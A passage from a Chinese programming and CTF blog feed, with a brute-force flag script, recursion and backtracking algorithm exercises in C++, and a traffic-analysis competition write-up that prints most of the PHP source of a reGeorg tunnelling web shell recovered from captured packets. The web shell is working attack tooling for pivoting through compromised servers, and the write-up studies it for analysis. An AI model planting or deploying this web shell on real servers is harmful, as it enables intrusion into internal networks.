class="string">'TASC'</span></span><br><span class="line">part2=<span class="string">'O3RJMV'</span></span><br><span class="line">part3=<span class="string">'WDJKX'</span></span><br><span class="line">part4=<span class="string">'ZM'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(astr)</span>:</span></span><br><span class="line">    flag=part1+astr[<span class="number">0</span>]+part2+astr[<span class="number">1</span>]+part3+astr[<span class="number">2</span>]+part4</span><br><span class="line">    md5Processer=_md5.md5()</span><br><span class="line">    md5Processer.update(flag.encode())</span><br><span class="line">    md5=md5Processer.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">5</span>] ==<span class="string">'e9032'</span>:</span><br><span class="line">        print(flag)</span><br><span class="line">        print(md5)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(i,astr)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> table:    </span><br><span class="line">        temp=astr </span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">           test(temp)        </span><br><span class="line">           <span class="keyword">break</span>     </span><br><span class="line">        temp+=char</span><br><span class="line">        bf(i<span class="number">-1</span>,temp)</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">bf(<span class="number">3</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>不一会就爆破出来了, 明文是TASCJO3RJMVKWDJKXLZM 算出MD5加上格式 <code>flag：nctf{e9032994dabac08080091151380478a2}</code></p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>递归解决汉诺塔问题</title>
    <url>/2017/12/26/%E9%80%92%E5%BD%92%E8%A7%A3%E5%86%B3%E6%B1%89%E8%AF%BA%E5%A1%94%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>非常有意思的问题和解法. 递归是真的烧脑啊.  </p>
<a id="more"></a>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hanoi</span><span class="params">(<span class="keyword">int</span> n, <span class="built_in">string</span> from,<span class="built_in">string</span> to,<span class="built_in">string</span> buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Move a plate from "</span> + from + <span class="string">" to "</span> + to &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		hanoi(n - <span class="number">1</span>, from, buffer, to);</span><br><span class="line">		hanoi(<span class="number">1</span>, from, to, buffer);</span><br><span class="line">		hanoi(n - <span class="number">1</span>, buffer, to, from);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">	hanoi(n, <span class="string">"A"</span>, <span class="string">"C"</span>, <span class="string">"B"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>部分数据结构题目和其他算法存档</title>
    <url>/2018/03/04/%E9%83%A8%E5%88%86%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E7%9B%AE%E5%92%8C%E5%85%B6%E4%BB%96%E7%AE%97%E6%B3%95%E5%AD%98%E6%A1%A3/</url>
    <content><![CDATA[<p>存个档~</p>
<a id="more"></a>

<h4 id="1-求一个集合的幂集"><a href="#1-求一个集合的幂集" class="headerlink" title="1.求一个集合的幂集"></a>1.求一个集合的幂集</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPowerSetEx</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;<span class="built_in">set</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;result, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; last, <span class="keyword">unsigned</span> <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pos &lt; <span class="built_in">set</span>.size()) &#123;  <span class="comment">//PS: 这里的last表示的是上一次的意思_(:3」∠)_</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">set</span>.size() - pos; ++i) &#123;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; temp = last;</span><br><span class="line">			temp.push_back(<span class="built_in">set</span>[pos + i]);</span><br><span class="line">			result.push_back(temp);</span><br><span class="line">			getPowerSetEx(<span class="built_in">set</span>, result, temp, pos + i + <span class="number">1</span>);</span><br><span class="line">		&#125;			</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; getPowerSet(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="built_in">set</span>) &#123;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">	result.push_back(&#123;&#125;); <span class="comment">//空集</span></span><br><span class="line">	getPowerSetEx(<span class="built_in">set</span>, result, &#123;&#125;, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-背包问题"><a href="#2-背包问题" class="headerlink" title="2.背包问题"></a>2.背包问题</h4><p>设有ｎ个物品, 其重量分别为w1, w2, w3, …, wn, 所有物品的重量之和≥背包所能放置的重量Ｓ. 设计算法从中找出若干物品放入背包中, 使得其重量之和正好为Ｓ. </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getResult</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; &amp;items, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;&gt; &amp;result, <span class="keyword">int</span> &amp;weight, <span class="keyword">int</span> &amp;maxDepth, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; last, <span class="keyword">unsigned</span> <span class="keyword">int</span> pos, <span class="keyword">int</span> sum, <span class="keyword">int</span> depth)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">		<span class="keyword">return</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (pos &lt; items.size()) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; items.size() - pos; ++i) &#123;		</span><br><span class="line">			<span class="keyword">int</span> tempSum = sum + items[pos + i].second;</span><br><span class="line">			<span class="keyword">if</span> (tempSum &gt; weight) &#123; <span class="comment">//如果此时已经比重量大了, 再往下试只会更大(所以要求数据从小到大排序)</span></span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; temp = last;</span><br><span class="line">			temp.emplace_back(items[pos + i]);</span><br><span class="line">			<span class="keyword">if</span> (tempSum == weight) &#123;</span><br><span class="line">				result.push_back(temp);</span><br><span class="line">			&#125;</span><br><span class="line">			getResult(items, result, weight, maxDepth, temp, pos + i + <span class="number">1</span>, tempSum, depth + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &amp;a, <span class="keyword">const</span> <span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &amp;b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (a.second &lt; b.second) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;&gt; backPack(<span class="keyword">int</span> s, <span class="keyword">int</span> n, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; items) &#123;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; itemCopy; <span class="comment">//保存原来的位置信息</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; items.size(); ++i) &#123;</span><br><span class="line">		itemCopy.emplace_back(i + <span class="number">1</span>, items[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;&gt; result;</span><br><span class="line">	<span class="built_in">std</span>::sort(itemCopy.begin(), itemCopy.end(), compare); <span class="comment">//按照从小到大排序</span></span><br><span class="line"></span><br><span class="line">	getResult(itemCopy, result, s, n, &#123;&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-X皇后问题"><a href="#3-X皇后问题" class="headerlink" title="3.X皇后问题"></a>3.X皇后问题</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isVaild</span><span class="params">(<span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;checkerBoard)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i) &#123;<span class="comment">//检查纵向是否重复</span></span><br><span class="line">		<span class="keyword">if</span> (checkerBoard[i][col] == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; col; ++i) &#123;<span class="comment">//检查左上方是否重复</span></span><br><span class="line">		<span class="keyword">if</span> (row - col + i &gt;= <span class="number">0</span> &amp;&amp; checkerBoard[row - col + i][i] == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (checkerBoard.size() - col); ++i) &#123;<span class="comment">//检查右上方是否重复</span></span><br><span class="line">		<span class="keyword">if</span> (row - i &gt;= <span class="number">0</span> &amp;&amp; checkerBoard[row - i][col + i] == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">queen</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&gt; &amp;result, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; lastCheckerBoard, <span class="keyword">int</span> row)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (row == lastCheckerBoard.size()) &#123;</span><br><span class="line">		result.push_back(lastCheckerBoard);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lastCheckerBoard.size(); ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (isVaild(row, i, lastCheckerBoard)) &#123;</span><br><span class="line">			<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; temp = lastCheckerBoard;</span><br><span class="line">			temp[row][i] = <span class="number">1</span>;</span><br><span class="line">			queen(result, temp, row + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printQueen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&gt; result;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; checkBoard(<span class="number">8</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="number">8</span>, <span class="number">0</span>));</span><br><span class="line">	queen(result, checkBoard, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> borad : result) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		++i;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> row : borad) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">auto</span> col : row) &#123;</span><br><span class="line">				<span class="keyword">if</span> (col == <span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"■"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"□"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>铁三杯十三赛区流量分析部分题目 WriteUp</title>
    <url>/2018/05/26/%E9%93%81%E4%B8%89%E6%9D%AF%E5%8D%81%E4%B8%89%E8%B5%9B%E5%8C%BA%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%20WriteUp/</url>
    <content><![CDATA[<p>为什么说部分呢, 因为有些题目忘记截图了 <code>_(:з」∠)_</code>, 所以只有 8-14 题的 writeup, 好在之前的题目都比较常规, 刚好从第8题开始有难度. 所以直接从 0x08 开始吧. 顺便把数据包也上传了, 链接: <a href="https://pan.baidu.com/s/17ne-6R_yTCYEknRnJwu2EA" target="_blank" rel="noopener">https://pan.baidu.com/s/17ne-6R_yTCYEknRnJwu2EA</a> 提取密码: vi2e 解压密码 t3sec.org.cn</p>
<h3 id="0x08-黑客在第二个目标机上添加的用户名和密码是什么"><a href="#0x08-黑客在第二个目标机上添加的用户名和密码是什么" class="headerlink" title="0x08 黑客在第二个目标机上添加的用户名和密码是什么"></a>0x08 黑客在第二个目标机上添加的用户名和密码是什么</h3><p>这个得从之前的包说起, 有个 model.php, 长这样</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*                   _____                                    </span></span><br><span class="line"><span class="comment">   ____   ______  __|___  |__  ______  _____  _____   ______  </span></span><br><span class="line"><span class="comment"> |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| </span></span><br><span class="line"><span class="comment"> |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | </span></span><br><span class="line"><span class="comment"> |__|__\|______||______|  __||______|_____/|__|__\|______| </span></span><br><span class="line"><span class="comment">                    |_____|</span></span><br><span class="line"><span class="comment">                    ... every office needs a tool like Georg</span></span><br><span class="line"><span class="comment">                    </span></span><br><span class="line"><span class="comment">  willem<span class="doctag">@sensepost</span>.com / @_w_m__</span></span><br><span class="line"><span class="comment">  sam<span class="doctag">@sensepost</span>.com / <span class="doctag">@trowalts</span></span></span><br><span class="line"><span class="comment">  etienne<span class="doctag">@sensepost</span>.com / <span class="doctag">@kamp</span>_staaldraad</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Legal Disclaimer</span></span><br><span class="line"><span class="comment">Usage of reGeorg for attacking networks without consent</span></span><br><span class="line"><span class="comment">can be considered as illegal activity. The authors of</span></span><br><span class="line"><span class="comment">reGeorg assume no liability or responsibility for any</span></span><br><span class="line"><span class="comment">misuse or damage caused by this program.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">If you find reGeorge on one of your servers you should</span></span><br><span class="line"><span class="comment">consider the server compromised and likely further compromise</span></span><br><span class="line"><span class="comment">to exist within your internal network.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">For more information, see:</span></span><br><span class="line"><span class="comment">https://github.com/sensepost/reGeorg</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"allow_url_fopen"</span>, <span class="keyword">true</span>);</span><br><span class="line">ini_set(<span class="string">"allow_url_include"</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !function_exists(<span class="string">'apache_request_headers'</span>) ) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">apache_request_headers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $arh = <span class="keyword">array</span>();</span><br><span class="line">        $rx_http = <span class="string">'/\AHTTP_/'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span>( preg_match($rx_http, $key) ) &#123;</span><br><span class="line">                $arh_key = preg_replace($rx_http, <span class="string">''</span>, $key);</span><br><span class="line">                $rx_matches = <span class="keyword">array</span>();</span><br><span class="line">                $rx_matches = explode(<span class="string">'_'</span>, $arh_key);</span><br><span class="line">                <span class="keyword">if</span>( count($rx_matches) &gt; <span class="number">0</span> <span class="keyword">and</span> strlen($arh_key) &gt; <span class="number">2</span> ) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span>($rx_matches <span class="keyword">as</span> $ak_key =&gt; $ak_val) &#123;</span><br><span class="line">                        $rx_matches[$ak_key] = ucfirst($ak_val);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $arh_key = implode(<span class="string">'-'</span>, $rx_matches);</span><br><span class="line">                &#125;</span><br><span class="line">                $arh[$arh_key] = $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>( $arh );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'GET'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Georg says, 'All seems fine'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span>) &#123;</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	$headers=apache_request_headers();</span><br><span class="line">	$cmd = $headers[<span class="string">"X-CMD"</span>];</span><br><span class="line">    <span class="keyword">switch</span>($cmd)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"CONNECT"</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				$target = $headers[<span class="string">"X-TARGET"</span>];</span><br><span class="line">				$port = (int)$headers[<span class="string">"X-PORT"</span>];</span><br><span class="line">				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">				<span class="keyword">if</span> ($sock === <span class="keyword">false</span>) </span><br><span class="line">				&#123;	</span><br><span class="line">					header(<span class="string">'X-STATUS: FAIL'</span>);</span><br><span class="line">					header(<span class="string">'X-ERROR: Failed creating socket'</span>);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$res = @socket_connect($sock, $target, $port);</span><br><span class="line">                <span class="keyword">if</span> ($res === <span class="keyword">false</span>) </span><br><span class="line">				&#123; </span><br><span class="line">					header(<span class="string">'X-STATUS: FAIL'</span>);</span><br><span class="line">					header(<span class="string">'X-ERROR: Failed connecting to target'</span>);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				socket_set_nonblock($sock);	</span><br><span class="line">				@session_start();</span><br><span class="line">				$_SESSION[<span class="string">"run"</span>] = <span class="keyword">true</span>;</span><br><span class="line">                $_SESSION[<span class="string">"writebuf"</span>] = <span class="string">""</span>;</span><br><span class="line">                $_SESSION[<span class="string">"readbuf"</span>] = <span class="string">""</span>;</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                header(<span class="string">'X-STATUS: OK'</span>);</span><br><span class="line">                header(<span class="string">"Connection: close"</span>);</span><br><span class="line">                ignore_user_abort();</span><br><span class="line">                ob_start();</span><br><span class="line">                $size = ob_get_length();</span><br><span class="line">                header(<span class="string">"Content-Length: $size"</span>);</span><br><span class="line">                ob_end_flush();</span><br><span class="line">                flush();            </span><br><span class="line">				session_write_close();</span><br><span class="line">                </span><br><span class="line">				<span class="keyword">while</span> ($_SESSION[<span class="string">"run"</span>])</span><br><span class="line">				&#123;</span><br><span class="line">					$readBuff = <span class="string">""</span>;</span><br><span class="line">					@session_start();</span><br><span class="line">					$writeBuff = $_SESSION[<span class="string">"writebuf"</span>];</span><br><span class="line">					$_SESSION[<span class="string">"writebuf"</span>] = <span class="string">""</span>;</span><br><span class="line">					session_write_close();</span><br><span class="line">                    <span class="keyword">if</span> ($writeBuff != <span class="string">""</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						$i = socket_write($sock, $writeBuff, strlen($writeBuff));</span><br><span class="line">						<span class="keyword">if</span>($i === <span class="keyword">false</span>)</span><br><span class="line">						&#123; </span><br><span class="line">							@session_start();</span><br><span class="line">                            $_SESSION[<span class="string">"run"</span>] = <span class="keyword">false</span>;</span><br><span class="line">                            session_write_close();</span><br><span class="line">                            header(<span class="string">'X-STATUS: FAIL'</span>);</span><br><span class="line">							header(<span class="string">'X-ERROR: Failed writing socket'</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">while</span> ($o = socket_read($sock, <span class="number">512</span>)) &#123;</span><br><span class="line">					<span class="keyword">if</span>($o === <span class="keyword">false</span>)</span><br><span class="line">						&#123; </span><br><span class="line">                            @session_start();</span><br><span class="line">                            $_SESSION[<span class="string">"run"</span>] = <span class="keyword">false</span>;</span><br><span class="line">                            session_write_close();</span><br><span class="line">							header(<span class="string">'X-STATUS: FAIL'</span>);</span><br><span class="line">							header(<span class="string">'X-ERROR: Failed reading from socket'</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						$readBuff .= $o;</span><br><span class="line">					&#125;</span><br><span class="line">                    <span class="keyword">if</span> ($readBuff!=<span class="string">""</span>)&#123;</span><br><span class="line">                        @session_start();</span><br><span class="line">                        $_SESSION[<span class="string">"readbuf"</span>] .= $readBuff;</span><br><span class="line">                        session_write_close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">#sleep(0.2);</span></span><br><span class="line">				&#125;</span><br><span class="line">                socket_close($sock);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"DISCONNECT"</span>:</span><br><span class="line">			&#123;</span><br><span class="line">                error_log(<span class="string">"DISCONNECT recieved"</span>);</span><br><span class="line">				@session_start();</span><br><span class="line">				$_SESSION[<span class="string">"run"</span>] = <span class="keyword">false</span>;</span><br><span class="line">				session_write_close();</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"READ"</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				@session_start();</span><br><span class="line">				$readBuffer = $_SESSION[<span class="string">"readbuf"</span>];</span><br><span class="line">                $_SESSION[<span class="string">"readbuf"</span>]=<span class="string">""</span>;</span><br><span class="line">                $running = $_SESSION[<span class="string">"run"</span>];</span><br><span class="line">				session_write_close();</span><br><span class="line">                <span class="keyword">if</span> ($running) &#123;</span><br><span class="line">					header(<span class="string">'X-STATUS: OK'</span>);</span><br><span class="line">                    header(<span class="string">"Connection: Keep-Alive"</span>);</span><br><span class="line">					<span class="keyword">echo</span> $readBuffer;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    header(<span class="string">'X-STATUS: FAIL'</span>);</span><br><span class="line">                    header(<span class="string">'X-ERROR: RemoteSocket read filed'</span>);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"FORWARD"</span>:</span><br><span class="line">			&#123;</span><br><span class="line">                @session_start();</span><br><span class="line">                $running = $_SESSION[<span class="string">"run"</span>];</span><br><span class="line">				session_write_close();</span><br><span class="line">                <span class="keyword">if</span>(!$running)&#123;</span><br><span class="line">                    header(<span class="string">'X-STATUS: FAIL'</span>);</span><br><span class="line">					header(<span class="string">'X-ERROR: No more running, close now'</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                header(<span class="string">'Content-Type: application/octet-stream'</span>);</span><br><span class="line">				$rawPostData = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">				<span class="keyword">if</span> ($rawPostData) &#123;</span><br><span class="line">					@session_start();</span><br><span class="line">					$_SESSION[<span class="string">"writebuf"</span>] .= $rawPostData;</span><br><span class="line">					session_write_close();</span><br><span class="line">					header(<span class="string">'X-STATUS: OK'</span>);</span><br><span class="line">                    header(<span class="string">"Connection: Keep-Alive"</span>);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					header(<span class="string">'X-STATUS: FAIL'</span>);</span><br><span class="line">					header(<span class="string">'X-ERROR: POST request read filed'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span 